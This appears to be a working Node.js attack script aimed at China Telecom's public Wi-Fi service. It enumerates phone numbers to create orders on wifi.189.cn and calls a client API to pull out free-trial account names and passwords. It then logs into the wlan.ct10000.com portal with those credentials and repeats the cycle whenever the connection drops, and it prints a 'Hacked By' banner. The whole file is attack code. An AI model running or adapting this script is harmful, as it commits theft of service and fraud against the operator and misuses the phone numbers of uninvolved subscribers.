var http = require('http');
var querystring = require('querystring');
try {
    var colors = require('./colors');
} catch (e) {
    console.warn('缺少 colors 模块');
}

var colorConsole = function (str, color) {
    // 彩色输出
    var colorful = str[color];
    if (!colorful)
        console.log(str);
    else
        console.log(colorful.bold);
};

var httpPost = (function (querystring, http) {
    // 发起 POST 请求
    var createOpt = function (opt) {
        var options = {
            method: 'POST',
            host: opt.host || 'wifi.189.cn',
            path: opt.path || './',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': querystring.stringify(opt.contents).length
            }
        };
        if (opt.cookie) {
            options.headers.cookie = opt.cookie;
        }
        return options;
    };

    var post = function (opt, cb) {
        var req = http.request(createOpt(opt), function (res) {
            res.setEncoding('utf8');
            var output = '';
            res.on('data', function (data) {
                output += data;
            }).on('end', function () {
                cb(res, output);
            });
        });

        req.on('error', function (e) {
            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
            reconnect();
        });

        req.write(querystring.stringify(opt.contents)); // 写入请求内容
        req.end();
    };

    return post;
})(querystring, http);

var checkNet = (function (httpPost) {
    var check = function (cb) {
        // 检测网络是否连接上
        httpPost({
                host: 'www.baidu.com',
                path: '/index.html'
            },
            function (res) {
                if (res.statusCode !== 200) {
                    colorConsole('网络断开，开始下一组尝试...\n', 'grey');
                    cb(true);
                } else
                    setTimeout(check, 10000); // 每十秒检测一次
            });
    };

    return check;
})(httpPost);

var linkStart = (function (httpPost, checkNet) {
    var init = {
        cookie: null,
        phone: undefined
    };

    var openReq = function (phone) {
        // 发起请求，得到 cookie
        colorConsole('\n-->\n开始发起请求', 'yellow');

        init.phone = init.phone || phone;

        if (init.cookie) return addGood(); // 已存在 cookie 则直接进行下一步

        httpPost({
                path: '/service/index.jsp'
            },
            function (res) {
                var cookie = res['headers']['set-cookie'][0].split(';')[0];
                init.cookie = cookie;
                colorConsole('获得的 cookie：' + cookie + '\n', 'cyan');
                addGood(); // 触发 addGood 请求
            });
    };

    var addGood = function () {
        // 向购物车添加物品
        colorConsole('开始模拟向购物车添加物品...\n', 'yellow');

        var options = {
            path: '/service/cart.do',
            cookie: init.cookie,
            contents: {
                method: 'addGood',
                confirm: 'yes',
                cardId: 1,
                type: 1,
                count: 1
            }
        };

        httpPost(options, list);
    };

    var list = function () {
        // 打开购物车，使请求有效化
        colorConsole('打开购物车，使请求有效化...\n', 'yellow');

        var options = {
            path: '/service/cart.do',
            cookie: init.cookie,
            contents: {
                method: 'list'
            }
        };

        httpPost(options, getOrder);
    };

    var getOrder = function () {
        // 获取订单号
        colorConsole('开始获取订单号，手机号：' + init.phone + '...\n', 'yellow');

        var options = {
            path: '/service/user.do',
            cookie: init.cookie,
            contents: {
                method: 'buy',
                confirm: 'yes',
                shopCartFlag: 'shopCart',
                cardType: 1,
                cardPayType: 'yi',
                user_phone: '',
                smsVerifyCode: '',
                isBenJi: 'no',
                phone: init.phone,
                phone_1: init.phone
            }
        };

        httpPost(options, function (res, data) {
            if (data[0] === '1') {
                // 得到订单号，开始尝试登录
                var orderId = data.split(',')[1];
                colorConsole('得到的订单号：' + orderId + '\n', 'cyan');
                return getPwd(orderId);
            } else {
                if (data.indexOf('购物车为空') !== -1) {
                    // 若没进行购物车添加，则重新发起请求
                    colorConsole('购物车为空，重新添加', 'magenta');
                    return list();
                }
                // 否则递增电话号码重试
                colorConsole(data.split(',')[1] + ' || 没有得到订单号，继续下一组尝试...\n', 'grey');
                return getOrder();
            }
        });

        ++init.phone; // 为下次计算做准备
    };

    var getPwd = function (orderId) {
        // 获取帐密
        colorConsole('开始获取账号密码...\n', 'yellow');

        var options = {
            path: '/clientApi.do',
            contents: {
                method: 'get10mCard',
                orderId: orderId
            }
        };

        httpPost(options, function (res, data) {
            colorConsole('收到的数据：' + data + '\n', 'cyan');
            if (data.indexOf('次数过多') !== -1)
                return false;
            var t = data.split(','); // 获取有效信息
            if (t[4] && t[5]) {
                hackLogin(t[4], t[5]);
            } else {
                colorConsole('未获取到，开始下一组尝试...\n', 'grey');
                getOrder();
            }
        });
    };

    var hackLogin = (function () {
        var isSecondTry = false; // 两次尝试计数

        var login = function (uname, pwd) {
            // 登录
            colorConsole('开始登录...\n', 'yellow');

            var options = {
                host: 'wlan.ct10000.com',
                path: '/portal/login4V2.do',
                contents: {
                    username: uname,
                    password: pwd,
                    validateCode: '',
                    postfix: '@wlan.sh.chntel.com',
                    address: 'sh',
                    loginvalue: 'null',
                    basePath: 'http://wlan.ct10000.com:80/portal/',
                    language: 'CN_SC',
                    longNameLength: 32,
                    NasType: 'Huawei',
                    NasName: 'BJ-JA-SR-1.M.ME60', // BUCT 默认值
                    OrgURL: 'null',
                    isMobileRand: false,
                    isNeedValidateCode: false
                } // 登录表单，似乎所有项目都不能少
            };

            httpPost(options, function (res, data) {

                if (data.indexOf('passwd error' /* 登录失败会返回含有此字符串的网页*/ ) === -1) {

                    colorConsole('登录成功！八分钟后开始检查连接状态\t' + new Date().toTimeString().slice(0, 8) + '\n\n======= Hacked By Dolphin With Node.js =======\n', 'green');

                    isSecondTry = false; // 重置计数

                    setTimeout(function () {
                        colorConsole('开始检查网络连接...\n', 'magenta');
                        checkNet(function (isOffline) {
                            if (isOffline) getOrder();
                        });
                    }, 480000); // 八分钟触发定时器

                } else {
                    if (isSecondTry) {
                        // 两次登录都失败就放弃吧
                        colorConsole('第二次登录失败，开始下一组尝试...\n', 'grey');
                        isSecondTry = false; // 重置计数
                        getOrder();
                    } else {
                        // 电信渣服务器可能不能即时处理分配到的账号密码
                        colorConsole('登录失败，3s 后再次尝试登录...\n', 'magenta');
                        setTimeout(function () {
                            isSecondTry = true; // 标记第二次尝试
                            login(uname, pwd);
                        }, 3000);
                    }
                }
            });
        };

        return login;
    })();

    return openReq;
})(httpPost, checkNet);

var reconnect = (function (linkStart) {
    var count = 0;

    var connect = function () {
        if (count > 10) {
            // 十次尝试失败退出进程
            colorConsole('重连失败，进程即将退出');
            process.exit();
        }
        setTimeout(linkStart, count * 3000);
        colorConsole(++count * 3 + '秒后尝试重连', 'red');
    };

    return connect;
})(linkStart);

// 进程会话
process.on('message', function (phone) {
    linkStart(phone);
}).on('uncaughtException', function (err) {
    // 异常抛出
    colorConsole('Uncaught Exception ' + err, 'red');
    process.exit();
});